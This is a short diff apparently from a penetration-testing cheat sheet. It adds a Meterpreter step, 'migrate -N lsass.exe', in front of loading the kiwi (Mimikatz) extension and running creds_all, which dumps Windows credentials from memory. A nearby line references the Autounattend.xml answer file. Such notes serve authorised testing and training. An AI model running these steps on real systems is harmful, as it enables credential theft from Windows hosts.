@@ -1408,6 +1408,7 @@ C:\\Windows\Panther\Autounattend.xml
 
 
 ```msfconsole
+migrate -N lsass.exe
 load kiwi
 ?
 creds_all
